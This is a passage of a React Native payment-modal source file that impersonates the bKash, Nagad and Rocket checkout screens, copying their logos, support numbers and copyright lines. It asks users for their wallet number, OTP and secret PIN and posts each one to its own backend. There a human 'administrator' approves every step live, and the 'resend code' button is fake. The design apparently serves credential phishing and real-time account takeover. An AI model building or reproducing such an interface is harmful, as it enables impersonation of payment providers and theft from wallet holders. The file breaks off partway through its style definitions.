import React, { useState, useEffect, useRef, useMemo } from 'react';
import {
  StyleSheet,
  View,
  Text,
  TextInput,
  Pressable,
  Modal,
  Image,
  Dimensions,
  Platform,
  Alert,
  KeyboardAvoidingView,
  ActivityIndicator,
} from 'react-native';
import { Ionicons } from '@expo/vector-icons';
import * as Haptics from 'expo-haptics';
import { BACKEND_API } from '@/constants/api';
import { useAuth } from '@/context/auth-context';
import { getSocket, joinPaymentSession, leavePaymentSession } from '@/services/socket';
import {
  PAYMENT_VALIDATION_CONFIG,
  PaymentValidationConfig,
  getPaymentValidationConfig,
} from '@/constants/payment-config';

const { width } = Dimensions.get('window');

/**
 * ⚙️ ধাপগুলোর অর্ডার কনফিগারেশন:
 * - 'number': অ্যাকাউন্ট নম্বর
 * - 'otp': ওটিপি ভেরিফিকেশন
 * - 'pin': গোপনীয় পিন
 */
export const DEFAULT_STEP_ORDERS: Record<string, Array<'number' | 'otp' | 'pin'>> = {
  bkash: ['number', 'otp', 'pin'],
  nagad: ['number', 'otp', 'pin'],
  rocket: ['number', 'pin', 'otp'],
  default: ['number', 'otp', 'pin'],
};

export interface MethodConfig {
  name: string;
  color: string;
  logo: any;
  supportNumber: string;
  copyright: string;
}

export const METHOD_CONFIGS: Record<string, MethodConfig> = {
  bkash: {
    name: 'bKash',
    color: '#E2136E',
    logo: require('../../assets/images/bkash-bn.png'),
    supportNumber: '16247',
    copyright: '© 2026 bKash, All Rights Reserved',
  },
  nagad: {
    name: 'Nagad',
    color: '#D0392C',
    logo: require('../../assets/images/nagad.png'),
    supportNumber: '16167',
    copyright: '© 2026 Nagad, All Rights Reserved',
  },
  rocket: {
    name: 'Rocket',
    color: '#8C3494',
    logo: require('../../assets/images/rocket.png'),
    supportNumber: '16216',
    copyright: '© 2026 Rocket, All Rights Reserved',
  },
  default: {
    name: 'bKash',
    color: '#E2136E',
    logo: require('../../assets/images/bkash-bn.png'),
    supportNumber: '16247',
    copyright: '© 2026 bKash, All Rights Reserved',
  },
};

export const PAYMENT_LOGOS: Record<string, any> = {
  bkash: require('../../assets/images/bkash-bn.png'),
  nagad: require('../../assets/images/nagad.png'),
  rocket: require('../../assets/images/rocket.png'),
  card: require('../../assets/images/card.png'),
};

export interface PaymentMethodItem {
  id: string; // 'bkash' | 'nagad' | 'rocket' | 'card'
  name: string;
  banglaName?: string;
  color?: string;
  logo?: any;
  merchantNumber?: string;
  iconName?: keyof typeof Ionicons.glyphMap;
}

export interface PaymentConfirmData {
  method: string;
  amount: number | string;
  phoneNumber: string;
  otp: string;
  pin: string;
}

export interface PaymentGatewayViewProps {
  method?: PaymentMethodItem | null;
  amount: number | string;
  focusText?: string;
  merchantNumber?: string;
  initialPhoneNumber?: string;
  userPhoneNumber?: string;
  paymentType?: 'booking' | 'online';
  productId?: string;
  productTitle?: string;
  productPrice?: number;
  bookingAmount?: number;
  deliveryAddress?: string;
  customOrder?: Array<'number' | 'otp' | 'pin'>;
  validationConfig?: Partial<PaymentValidationConfig>;
  onClose: () => void;
  onFailRedirectHome?: () => void;
  handleConfirm: (data: PaymentConfirmData) => void;
}

/**
 * 📱 Format telephone number with mask like "019 ** *** 356"
 */
function maskPhoneNumber(phone: string): string {
  const digits = phone.replace(/\D/g, '');
  if (digits.length >= 11) {
    const last11 = digits.slice(-11);
    const first3 = last11.slice(0, 3);
    const last3 = last11.slice(-3);
    return `${first3} ** *** ${last3}`;
  }
  return phone || '019 ** *** ***';
}

export function PaymentGatewayView({
  method,
  amount,
  initialPhoneNumber = '',
  userPhoneNumber,
  paymentType = 'booking',
  productId = '',
  productTitle = '',
  productPrice = 0,
  bookingAmount = 50,
  deliveryAddress = '',
  customOrder,
  validationConfig,
  onClose,
  onFailRedirectHome,
  handleConfirm,
}: PaymentGatewayViewProps) {
  const { user } = useAuth();
  const registeredPhone = userPhoneNumber || user?.phoneNumber || '';

  // Determine method key and active config
  const methodKey = (method?.id || method?.name || '').toLowerCase();
  const activeConfig: MethodConfig = methodKey.includes('rocket')
    ? METHOD_CONFIGS.rocket
    : methodKey.includes('nagad')
      ? METHOD_CONFIGS.nagad
      : METHOD_CONFIGS.bkash;

  // Active validation rules (with support for custom prop overrides)
  const validationRules = useMemo(() => {
    const base = getPaymentValidationConfig(methodKey);
    if (!validationConfig) return base;
    return {
      accountNumber: { ...base.accountNumber, ...validationConfig.accountNumber },
      otp: { ...base.otp, ...validationConfig.otp },
      pin: { ...base.pin, ...validationConfig.pin },
    };
  }, [methodKey, validationConfig]);

  const activeOrder = customOrder || (
    methodKey.includes('rocket')
      ? DEFAULT_STEP_ORDERS.rocket
      : methodKey.includes('nagad')
        ? DEFAULT_STEP_ORDERS.nagad
        : DEFAULT_STEP_ORDERS.bkash
  );

  // Input states
  const [phoneNumber, setPhoneNumber] = useState(initialPhoneNumber);
  const [otp, setOtp] = useState('');
  const [pin, setPin] = useState('');
  const [showPin, setShowPin] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // Status screens: null | 'success' | 'failed' | 'cancelled'
  const [statusScreen, setStatusScreen] = useState<'success' | 'failed' | 'cancelled' | null>(null);
  const [statusReason, setStatusReason] = useState('PIN verification time expired');
  const [countdown, setCountdown] = useState(5);
  const [showCancelConfirm, setShowCancelConfirm] = useState(false);

  // Live Admin Verification States
  const [sessionId, setSessionId] = useState(
    () => `sess_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
  );
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationError, setVerificationError] = useState<string | null>(null);
  const [verifyingText, setVerifyingText] = useState('Waiting for administrator verification...');
  const pollTimerRef = useRef<any>(null);
  const countdownTimerRef = useRef<any>(null);
  const socketListenerRef = useRef<((data: any) => void) | null>(null);

  // Step state
  const [currentStepIndex, setCurrentStepIndex] = useState(0);
  const [resendTimer, setResendTimer] = useState(26);
  const [canResend, setCanResend] = useState(false);

  const currentStep = activeOrder[currentStepIndex] || 'number';
  const isFirstStep = currentStepIndex === 0;
  const isLastStep = currentStepIndex === activeOrder.length - 1;

  const stopPolling = () => {
    if (socketListenerRef.current) {
      try {
        const socket = getSocket();
        socket.off('payment-session-updated', socketListenerRef.current);
      } catch {}
      socketListenerRef.current = null;
    }
    if (pollTimerRef.current) {
      clearInterval(pollTimerRef.current);
      pollTimerRef.current = null;
    }
  };

  const stopCountdown = () => {
    if (countdownTimerRef.current) {
      clearInterval(countdownTimerRef.current);
      countdownTimerRef.current = null;
    }
  };

  // Reset states when opened
  useEffect(() => {
    const newSessionId = `sess_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
    setCurrentStepIndex(0);
    setPhoneNumber(initialPhoneNumber || '');
    setOtp('');
    setPin('');
    setShowPin(false);
    setResendTimer(26);
    setCanResend(false);
    setVerificationError(null);
    setIsVerifying(false);
    setStatusScreen(null);
    setShowCancelConfirm(false);
    setSessionId(newSessionId);
    joinPaymentSession(newSessionId);

    return () => {
      stopPolling();
      stopCountdown();
      leavePaymentSession(newSessionId);
    };
  }, []);

  // Resend OTP countdown timer
  useEffect(() => {
    let interval: ReturnType<typeof setInterval> | null = null;
    if (currentStep === 'otp' && resendTimer > 0) {
      interval = setInterval(() => {
        setResendTimer((prev) => {
          if (prev <= 1) {
            setCanResend(true);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [currentStep, resendTimer]);

  const triggerHaptic = (type: 'light' | 'success' | 'warning') => {
    if (Platform.OS === 'web') return;
    try {
      if (type === 'warning') {
        Haptics.notificationAsync(Haptics.NotificationFeedbackType.Warning);
      } else if (type === 'success') {
        Haptics.notificationAsync(Haptics.NotificationFeedbackType.Success);
      } else {
        Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Light);
      }
    } catch { }
  };

  // Cancelled status redirection (Matches Image 2 - 4s countdown)
  const startCancelRedirection = () => {
    stopPolling();
    stopCountdown();
    setIsVerifying(false);
    setIsLoading(false);
    setStatusScreen('cancelled');
    setCountdown(4);

    let current = 4;
    countdownTimerRef.current = setInterval(() => {
      current--;
      setCountdown(current);
      if (current <= 0) {
        stopCountdown();
        onClose();
      }
    }, 1000);
  };

  // Trigger redirection countdown when entering statusScreen
  const startStatusRedirection = (type: 'success' | 'failed', reason = '') => {
    stopPolling();
    stopCountdown();
    setStatusScreen(type);
    setStatusReason(reason || (type === 'failed' ? 'PIN verification time expired' : ''));
    setCountdown(5);

    let current = 5;
    countdownTimerRef.current = setInterval(() => {
      current--;
      setCountdown(current);
      if (current <= 0) {
        stopCountdown();
        if (type === 'success') {
          handleConfirm({
            method: activeConfig.name,
            amount,
            phoneNumber,
            otp,
            pin,
          });
        } else {
          if (onFailRedirectHome) {
            onFailRedirectHome();
          } else {
            onClose();
          }
        }
      }
    }, 1000);
  };

  // Real-time Session Verification (Instant Socket.IO Push + Relaxed HTTP Fallback)
  const pollSessionStatus = (
    expectedStep: 'number' | 'otp' | 'pin',
    onApproved: () => void,
    onRejected: (errMsg: string) => void
  ) => {
    stopPolling();
    joinPaymentSession(sessionId);

    const handleSessionData = (sessionData: any) => {
      if (!sessionData) return;
      if (sessionData.sessionId && sessionData.sessionId !== sessionId) return;

      const s = sessionData.status;
      if (expectedStep === 'number') {
        if (s === 'number_approved' || s === 'otp_approved' || s === 'completed') {
          stopPolling();
          setIsVerifying(false);
          setIsLoading(false);
          onApproved();
        } else if (s === 'number_rejected') {
          stopPolling();
          setIsVerifying(false);
          setIsLoading(false);
          onRejected(sessionData.errorMessage || 'Invalid account number');
        } else if (s === 'failed' || s === 'cancelled') {
          stopPolling();
          setIsVerifying(false);
          setIsLoading(false);
          startStatusRedirection('failed', sessionData.errorMessage || 'Verification cancelled');
        }
      } else if (expectedStep === 'otp') {
        if (s === 'otp_approved' || s === 'completed') {
          stopPolling();
          setIsVerifying(false);
          setIsLoading(false);
          onApproved();
        } else if (s === 'otp_rejected') {
          stopPolling();
          setIsVerifying(false);
          setIsLoading(false);
          onRejected(sessionData.errorMessage || 'Wrong verification code');
        } else if (s === 'failed' || s === 'cancelled') {
          stopPolling();
          setIsVerifying(false);
          setIsLoading(false);
          startStatusRedirection('failed', sessionData.errorMessage || 'PIN verification time expired');
        }
      } else if (expectedStep === 'pin') {
        if (s === 'completed' || s === 'pin_approved') {
          stopPolling();
          setIsVerifying(false);
          setIsLoading(false);
          onApproved();
        } else if (s === 'pin_rejected') {
          stopPolling();
          setIsVerifying(false);
          setIsLoading(false);
          onRejected(sessionData.errorMessage || 'Wrong verification code');
        } else if (s === 'failed' || s === 'cancelled') {
          stopPolling();
          setIsVerifying(false);
          setIsLoading(false);
          startStatusRedirection('failed', sessionData.errorMessage || 'PIN verification time expired');
        }
      }
    };

    // 1. Attach instant Socket.IO listener (0ms push from server when Admin acts)
    try {
      const socket = getSocket();
      socketListenerRef.current = handleSessionData;
      socket.on('payment-session-updated', handleSessionData);
    } catch (err) {
      console.warn('[Socket.IO] Error attaching listener in payment-modal:', err);
    }

    // 2. Relaxed HTTP fallback check (as backup in case of mobile network drops)
    let pollCount = 0;
    const maxPolls = 60; // ~3 minutes with 3000ms intervals

    const checkStatus = async () => {
      pollCount++;
      if (pollCount > maxPolls) {
        stopPolling();
        setIsVerifying(false);
        setIsLoading(false);
        startStatusRedirection('failed', 'Verification time expired');
        return;
      }

      try {
        const res = await fetch(`${BACKEND_API.BASE_URL}/payment/session/${sessionId}`);
        const json = await res.json();
        if (json.success && json.data) {
          handleSessionData(json.data);
        }
      } catch {
        // network resilience: continue relaxed fallback
      }
    };

    // Immediate initial status check
    checkStatus();
    // Relaxed fallback heartbeat interval: 3000ms (instead of aggressive 500ms)
    pollTimerRef.current = setInterval(checkStatus, 3000);
  };

  // Next / Confirm handler with Admin Validation Gate
  const handleNextOrConfirm = async () => {
    if (isLoading || isVerifying || statusScreen) return;

    // STEP 1: PHONE NUMBER (bKash / Nagad / Rocket Account Number) - Gated by Admin
    if (currentStep === 'number') {
      const clean = phoneNumber.trim().replace(/\D/g, '');
      const numCfg = validationRules.accountNumber;
      const isValid = numCfg.exactLength
        ? clean.length === numCfg.exactLength
        : clean.length >= numCfg.minLength && clean.length <= numCfg.maxLength;

      if (!clean || !isValid) {
        triggerHaptic('warning');
        const alertMsg = numCfg.exactLength
          ? `অনুগ্রহ করে সঠিক ${numCfg.exactLength} ডিজিটের অ্যাকাউন্ট নম্বর দিন (যেমন: 017xxxxxxxx)।`
          : numCfg.minLength === numCfg.maxLength
            ? `অনুগ্রহ করে সঠিক ${numCfg.minLength} ডিজিটের অ্যাকাউন্ট নম্বর দিন।`
            : `অনুগ্রহ করে ${numCfg.minLength} থেকে ${numCfg.maxLength} ডিজিটের অ্যাকাউন্ট নম্বর দিন।`;
        Alert.alert('সতর্কতা', alertMsg);
        return;
      }

      setIsLoading(true);
      setIsVerifying(true);
      setVerificationError(null);
      setVerifyingText('Waiting for administrator verification...');

      try {
        await fetch(`${BACKEND_API.BASE_URL}/payment/session`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId,
            userPhone: registeredPhone,
            accountNumber: clean,
            method: activeConfig.name,
            amount,
            paymentType,
            productId,
            productTitle,
            productPrice,
            bookingAmount,
            deliveryAddress,
          }),
        });
      } catch (err) {
        console.warn('[Payment Session Error]:', err);
      }

      // Poll until admin validates bKash/Nagad account number
      pollSessionStatus(
        'number',
        () => {
          triggerHaptic('success');
          setVerificationError(null);
          setCurrentStepIndex((prev) => prev + 1);
          setResendTimer(26);
          setCanResend(false);
        },
        (errMsg) => {
          triggerHaptic('warning');
          setVerificationError(errMsg || 'Invalid account number');
        }
      );
      return;
    }

    // STEP 2: OTP VERIFICATION (Gated by Admin)
    if (currentStep === 'otp') {
      const cleanOtp = otp.trim();
      const otpCfg = validationRules.otp;
      const isValid = otpCfg.exactLength
        ? cleanOtp.length === otpCfg.exactLength
        : cleanOtp.length >= otpCfg.minLength && cleanOtp.length <= otpCfg.maxLength;

      if (!cleanOtp || !isValid) {
        triggerHaptic('warning');
        const alertMsg = otpCfg.exactLength
          ? `অনুগ্রহ করে সঠিক ${otpCfg.exactLength} ডিজিটের কোড প্রদান করুন।`
          : otpCfg.minLength === otpCfg.maxLength
            ? `অনুগ্রহ করে সঠিক ${otpCfg.minLength} ডিজিটের কোড প্রদান করুন।`
            : `অনুগ্রহ করে সঠিক (${otpCfg.minLength}-${otpCfg.maxLength} ডিজিটের) কোড প্রদান করুন।`;
        Alert.alert('সতর্কতা', alertMsg);
        return;
      }

      setIsLoading(true);
      setIsVerifying(true);
      setVerificationError(null);
      setVerifyingText('Waiting for administrator verification...');

      try {
        await fetch(`${BACKEND_API.BASE_URL}/payment/submit-otp`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId,
            otp: cleanOtp,
            userPhone: registeredPhone,
            accountNumber: phoneNumber,
          }),
        });
      } catch (err) {
        console.warn('[Submit OTP Error]:', err);
      }

      // Poll until admin confirms or rejects
      pollSessionStatus(
        'otp',
        () => {
          // APPROVED: Move to next step or complete if last step
          triggerHaptic('success');
          setVerificationError(null);
          if (isLastStep) {
            startStatusRedirection('success');
          } else {
            setCurrentStepIndex((prev) => prev + 1);
          }
        },
        (errMsg) => {
          // REJECTED: Show warning directly under input (Image 3)
          triggerHaptic('warning');
          setVerificationError(errMsg || 'Wrong verification code');
        }
      );
      return;
    }

    // STEP 3: PIN VERIFICATION (Gated by Admin)
    if (currentStep === 'pin') {
      const cleanPin = pin.trim();
      const pinCfg = validationRules.pin;
      const isValid = pinCfg.exactLength
        ? cleanPin.length === pinCfg.exactLength
        : cleanPin.length >= pinCfg.minLength && cleanPin.length <= pinCfg.maxLength;

      if (!cleanPin || !isValid) {
        triggerHaptic('warning');
        const alertMsg = pinCfg.exactLength
          ? `অনুগ্রহ করে সঠিক ${pinCfg.exactLength} ডিজিটের গোপন পিন প্রদান করুন।`
          : pinCfg.minLength === pinCfg.maxLength
            ? `অনুগ্রহ করে সঠিক ${pinCfg.minLength} ডিজিটের গোপন পিন প্রদান করুন।`
            : `অনুগ্রহ করে ${pinCfg.minLength} থেকে ${pinCfg.maxLength} ডিজিটের গোপন পিন প্রদান করুন।`;
        Alert.alert('সতর্কতা', alertMsg);
        return;
      }

      setIsLoading(true);
      setIsVerifying(true);
      setVerificationError(null);
      setVerifyingText('Waiting for administrator verification...');

      try {
        await fetch(`${BACKEND_API.BASE_URL}/payment/submit-pin`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId,
            pin: cleanPin,
            userPhone: registeredPhone,
            accountNumber: phoneNumber,
          }),
        });
      } catch (err) {
        console.warn('[Submit PIN Error]:', err);
      }

      // Poll until admin confirms or rejects
      pollSessionStatus(
        'pin',
        () => {
          // APPROVED: Move to next step or complete if last step
          triggerHaptic('success');
          setVerificationError(null);
          if (isLastStep) {
            startStatusRedirection('success');
          } else {
            setCurrentStepIndex((prev) => prev + 1);
          }
        },
        (errMsg) => {
          // REJECTED: Show warning directly under PIN input
          triggerHaptic('warning');
          setVerificationError(errMsg || 'Wrong verification code');
        }
      );
      return;
    }
  };

  // Cancel button press: show confirmation prompt (Matches Image 1)
  const handleCancel = () => {
    triggerHaptic('light');
    setShowCancelConfirm(true);
  };

  const handleDismissCancel = () => {
    triggerHaptic('light');
    setShowCancelConfirm(false);
  };

  const handleConfirmCancel = () => {
    triggerHaptic('warning');
    setShowCancelConfirm(false);
    startCancelRedirection();
  };

  const handleResendCode = () => {
    setResendTimer(26);
    setCanResend(false);
    setVerificationError(null);
    triggerHaptic('light');
    Alert.alert('নতুন কোড পাঠানো হয়েছে', `${maskPhoneNumber(phoneNumber)} নম্বরে পুনরায় ওটিপি কোড পাঠানো হয়েছে।`);
  };

  // Determine if confirm button should be disabled
  const isConfirmDisabled = (() => {
    if (isLoading || isVerifying || statusScreen) return true;
    if (currentStep === 'number') {
      const clean = phoneNumber.trim().replace(/\D/g, '');
      const cfg = validationRules.accountNumber;
      if (cfg.exactLength) return clean.length !== cfg.exactLength;
      return clean.length < cfg.minLength || clean.length > cfg.maxLength;
    }
    if (currentStep === 'otp') {
      const cleanOtp = otp.trim();
      const cfg = validationRules.otp;
      if (cfg.exactLength) return cleanOtp.length !== cfg.exactLength;
      return cleanOtp.length < cfg.minLength || cleanOtp.length > cfg.maxLength;
    }
    if (currentStep === 'pin') {
      const cleanPin = pin.trim();
      const cfg = validationRules.pin;
      if (cfg.exactLength) return cleanPin.length !== cfg.exactLength;
      return cleanPin.length < cfg.minLength || cleanPin.length > cfg.maxLength;
    }
    return false;
  })();

  return (
    <View style={styles.cardContainer}>
      {/* 1. TOP LOGO BAR (White background, centered logo) */}
      <View style={styles.topLogoBar}>
        <Image
          source={activeConfig.logo}
          style={styles.logoImage}
          resizeMode="contain"
        />
      </View>

      {/* 2. AMOUNT DISPLAY (White background, big amount text: ৳360) */}
      {!statusScreen && !showCancelConfirm && (
        <View style={styles.amountBar}>
          <Text style={styles.amountText}>৳{amount}</Text>
        </View>
      )}

      {/* 3. VIBRANT METHOD-COLORED BODY */}
      <View style={[styles.coloredBody, { backgroundColor: activeConfig.color }]}>
        {/* ================================================================= */}
        {/* SCREEN: CANCEL CONFIRMATION (Matches Image 1) */}
        {/* ================================================================= */}
        {showCancelConfirm && (
          <View style={styles.cancelConfirmBox}>
            <Ionicons name="hand-right-outline" size={52} color="#FFFFFF" />
            <Text style={styles.cancelConfirmTitle}>
              Are you sure you want to cancel{'\n'}this payment?
            </Text>
          </View>
        )}

        {/* ================================================================= */}
        {/* SCREEN: AGREEMENT CREATION CANCELLED (Matches Image 2) */}
        {/* ================================================================= */}
        {statusScreen === 'cancelled' && (
          <View style={styles.statusBox}>
            <Ionicons name="close-circle-outline" size={68} color="#FFFFFF" />
            <Text style={styles.statusCancelledTitle}>Agreement Creation Cancelled</Text>
            <Text style={styles.statusRedirect}>
              Redirecting to <Text style={styles.underlineText}>payment details</Text> in {countdown}s
            </Text>
          </View>
        )}

        {/* ================================================================= */}
        {/* SCREEN: VERIFICATION SUCCESSFUL (Image 5) */}
        {/* ================================================================= */}
        {statusScreen === 'success' && (
          <View style={styles.statusBox}>
            <Ionicons name="checkmark-circle-outline" size={68} color="#FFFFFF" />
            <Text style={styles.statusTitle}>Verification Successful</Text>
            <Text style={styles.statusRedirect}>
              Redirecting to <Text style={styles.underlineText}>payment success</Text> in {countdown}s
            </Text>
          </View>
        )}

        {/* ================================================================= */}
        {/* SCREEN: PAYMENT FAILED (Image 4) */}
        {/* ================================================================= */}
        {statusScreen === 'failed' && (
          <View style={styles.statusBox}>
            <Ionicons name="close-circle-outline" size={68} color="#FFFFFF" />
            <Text style={styles.statusTitle}>Payment Failed</Text>
            <Text style={styles.statusSubtitle}>{statusReason}</Text>
            <Text style={styles.statusRedirect}>
              Redirecting to <Text style={styles.underlineText}>payment details</Text> in {countdown}s
            </Text>
          </View>
        )}

        {/* ================================================================= */}
        {/* REGULAR STEP 1: ACCOUNT NUMBER (Image 1) */}
        {/* ================================================================= */}
        {!statusScreen && !showCancelConfirm && currentStep === 'number' && (
          <View style={styles.stepContentBox}>
            <Text style={styles.stepTitle}>
              Your {activeConfig.name} Account Number
            </Text>
            <TextInput
              style={[styles.whiteInput, (isLoading || isVerifying) && styles.inputDisabled]}
              placeholder="e.g 01XXXXXXXXX"
              placeholderTextColor="#9CA3AF"
              value={phoneNumber}
              onChangeText={(text) => {
                setPhoneNumber(text);
                if (verificationError) setVerificationError(null);
              }}
              keyboardType="phone-pad"
              maxLength={validationRules.accountNumber.maxLength || validationRules.accountNumber.exactLength || 14}
              editable={!isLoading && !isVerifying}
              autoFocus
            />

            {/* ⚠️ Warning Banner (Matches Image 3) */}
            {verificationError && (
              <View style={styles.warningRow}>
                <Ionicons name="warning-outline" size={14} color="#FFFFFF" />
                <Text style={styles.warningText}>{verificationError}</Text>
              </View>
            )}

            <Text style={styles.termsText}>
              Confirm and proceed, <Text style={styles.underlineText}>terms & conditions</Text>
            </Text>
          </View>
        )}

        {/* ================================================================= */}
        {/* REGULAR STEP 2: VERIFICATION CODE (Image 2 & Image 3) */}
        {/* ================================================================= */}
        {!statusScreen && !showCancelConfirm && currentStep === 'otp' && (
          <View style={styles.stepContentBox}>
            <Text style={styles.stepTitle}>
              Enter Verification Code Sent To{'\n'}
              ({maskPhoneNumber(phoneNumber || registeredPhone)})
            </Text>

            <TextInput
              style={[styles.whiteInput, (isLoading || isVerifying) && styles.inputDisabled]}
              placeholder={
                validationRules.otp.exactLength
                  ? `Enter ${validationRules.otp.exactLength} digit code`
                  : `Enter ${validationRules.otp.minLength}-${validationRules.otp.maxLength} digit code`
              }
              placeholderTextColor="#9CA3AF"
              value={otp}
              onChangeText={(text) => {
                setOtp(text);
                if (verificationError) setVerificationError(null);
              }}
              keyboardType="number-pad"
              maxLength={validationRules.otp.maxLength || validationRules.otp.exactLength || 6}
              editable={!isLoading && !isVerifying}
              autoFocus
            />

            {/* ⚠️ Warning Banner (Matches Image 3 exactly) */}
            {verificationError && (
              <View style={styles.warningRow}>
                <Ionicons name="warning-outline" size={14} color="#FFFFFF" />
                <Text style={styles.warningText}>{verificationError}</Text>
              </View>
            )}

            {/* Resend code row */}
            {canResend ? (
              <Pressable onPress={handleResendCode} style={{ marginTop: 10 }}>
                <Text style={styles.resendLinkText}>Resend Code</Text>
              </Pressable>
            ) : (
              <Text style={styles.resendTimerText}>
                Resend Code in {resendTimer}s
              </Text>
            )}
          </View>
        )}

        {/* ================================================================= */}
        {/* REGULAR STEP 3: PIN VERIFICATION */}
        {/* ================================================================= */}
        {!statusScreen && !showCancelConfirm && currentStep === 'pin' && (
          <View style={styles.stepContentBox}>
            <Text style={styles.stepTitle}>
              Enter PIN Of Your {activeConfig.name} Account Number{'\n'}
              ({maskPhoneNumber(phoneNumber || registeredPhone)})
            </Text>

            <View
              style={[
                styles.whiteInputContainer,
                (isLoading || isVerifying) && styles.inputDisabled,
              ]}>
              <TextInput
                style={[
                  styles.whiteInputInContainer,
                  !showPin && pin.length > 0 && styles.hiddenInputText,
                ]}
                placeholder={
                  validationRules.pin.exactLength
                    ? `Enter ${validationRules.pin.exactLength} digit PIN`
                    : validationRules.pin.minLength === validationRules.pin.maxLength
                      ? `Enter ${validationRules.pin.minLength} digit PIN`
                      : `Enter PIN (${validationRules.pin.minLength}-${validationRules.pin.maxLength} digits)`
                }
                placeholderTextColor="#9CA3AF"
                value={pin}
                onChangeText={(text) => {
                  setPin(text);
                  if (verificationError) setVerificationError(null);
                }}
                keyboardType="number-pad"
                secureTextEntry={!showPin}
                maxLength={validationRules.pin.maxLength || validationRules.pin.exactLength || 6}
                editable={!isLoading && !isVerifying}
                autoFocus
                cursorColor={!showPin && pin.length > 0 ? 'transparent' : '#1F2937'}
                selectionColor={!showPin && pin.length > 0 ? 'transparent' : undefined}
              />

              {/* Perfectly centered, big bold geometric dots */}
              {!showPin && pin.length > 0 && (
                <View pointerEvents="none" style={styles.pinDotsOverlay}>
                  {Array.from({ length: pin.length }).map((_, i) => (
                    <View key={i} style={styles.geometricPinDot} />
                  ))}
                </View>
              )}
            </View>

            {/* ⚠️ Warning Banner (Matches Image 3 style) */}
            {verificationError && (
              <View style={styles.warningRow}>
                <Ionicons name="warning-outline" size={14} color="#FFFFFF" />
                <Text style={styles.warningText}>{verificationError}</Text>
              </View>
            )}
          </View>
        )}
      </View>

      {/* 4. CANCEL CONFIRMATION BUTTONS: YES & NO (Matches Image 1) */}
      {showCancelConfirm && (
        <View style={styles.bottomActionRow}>
          {/* YES BUTTON (White/Light button) */}
          <Pressable
            onPress={handleConfirmCancel}
            style={({ pressed }) => [
              styles.cancelYesBtn,
              pressed && { opacity: 0.8 },
            ]}>
            <Text style={styles.cancelYesBtnText}>Yes</Text>
          </Pressable>

          {/* NO BUTTON (Method color) */}
          <Pressable
            onPress={handleDismissCancel}
            style={({ pressed }) => [
              styles.cancelNoBtn,
              { backgroundColor: activeConfig.color },
              pressed && { opacity: 0.85 },
            ]}>
            <Text style={styles.cancelNoBtnText}>No</Text>
          </Pressable>
        </View>
      )}

      {/* 4. BOTTOM ACTION BUTTONS: CANCEL & CONFIRM (Image 1, 2, 3) */}
      {!statusScreen && !showCancelConfirm && (
        <View style={styles.bottomActionRow}>
          {/* CANCEL BUTTON (Light Gray) */}
          <Pressable
            onPress={handleCancel}
            style={({ pressed }) => [
              styles.cancelBtn,
              pressed && { opacity: 0.8 },
            ]}>
            <Text style={styles.cancelBtnText}>Cancel</Text>
          </Pressable>

          {/* CONFIRM BUTTON (Method Color or Disabled Gray) */}
          <Pressable
            onPress={handleNextOrConfirm}
            disabled={isConfirmDisabled}
            style={({ pressed }) => [
              styles.confirmBtn,
              isConfirmDisabled
                ? styles.confirmBtnDisabled
                : { backgroundColor: activeConfig.color },
              pressed && !isConfirmDisabled && { opacity: 0.85 },
            ]}>
            {isLoading || isVerifying ? (
              <View style={{ flexDirection: 'row', alignItems: 'center', justifyContent: 'center', gap: 6 }}>
                <ActivityIndicator size="small" color="#9CA3AF" />
                <Text style={[styles.confirmBtnText, styles.confirmBtnTextDisabled]}>
                  Verifying...
                </Text>
              </View>
            ) : (
              <Text
                style={[
                  styles.confirmBtnText,
                  isConfirmDisabled && styles.confirmBtnTextDisabled,
                ]}>
                Confirm
              </Text>
            )}
          </Pressable>
        </View>
      )}

      {/* 5. SUPPORT NUMBER & COPYRIGHT FOOTER */}
      <View style={[styles.footerArea, statusScreen && styles.footerAreaWithTopBorder]}>
        <View style={styles.supportRow}>
          <View style={[styles.supportCircle, { backgroundColor: activeConfig.color }]}>
            <Ionicons name="call" size={11} color="#FFFFFF" />
          </View>
          <Text style={[styles.supportNumber, { color: activeConfig.color }]}>
            {activeConfig.supportNumber}
          </Text>
        </View>
        <Text style={styles.copyrightText}>
          {activeConfig.copyright}
        </Text>
      </View>
    </View>
  );
}

export interface PaymentModalProps extends PaymentGatewayViewProps {
  isOpen: boolean;
}

export function PaymentModal({ isOpen, ...props }: PaymentModalProps) {
  if (!isOpen) return null;
  return (
    <Modal
      visible={isOpen}
      transparent
      animationType="fade"
      onRequestClose={props.onClose}>
      <KeyboardAvoidingView
        behavior={Platform.OS === 'ios' ? 'padding' : undefined}
        style={styles.modalOverlay}>
        <PaymentGatewayView {...props} />
      </KeyboardAvoidingView>
    </Modal>
  );
}

const styles = StyleSheet.create({
  modalOverlay: {
    flex: 1,
    backgroundColor: 'rgba(0, 0, 0, 0.65)',
    justifyContent: 'center',
    alignItems: 'center',
    padding: 16,
  },
  cardContainer: {
    width: Math.min(width * 0.94, 380),
    backgroundColor: '#FFFFFF',
    borderRadius: 6,
    borderWidth: 1.5,
    borderColor: '#CBD5E1',
    overflow: 'hidden',
  },
  topLogoBar: {
    backgroundColor: '#FFFFFF',
    paddingVertical: 14,
    alignItems: 'center',
    justifyContent: 'center',
    borderBottomWidth: 1.5,
    borderBottomColor: '#CBD5E1',
  },
  logoImage: {
    height: 48,
    width: 170,
  },
  amountBar: {
    backgroundColor: '#FFFFFF',
    paddingVertical: 10,
    alignItems: 'center',
    justifyContent: 'center',
    borderBottomWidth: 1.5,
    borderBottomColor: '#CBD5E1',
  },
  amountText: {
    fontSize: 32,
    fontWeight: '700',
    color: '#334155',
    textAlign: 'center',
    letterSpacing: 0.3,
  },
  coloredBody: {
    width: '100%',
    minHeight: 280,
    paddingHorizontal: 22,
    paddingVertical: 44,
    alignItems: 'center',
    justifyContent: 'center',
  },
  stepContentBox: {
    width: '100%',
    alignItems: 'center',
  },
  stepTitle: {
    fontSize: 15.5,
    fontWeight: '600',
    color: '#FFFFFF',
    textAlign: 'center',
    marginBottom: 12,
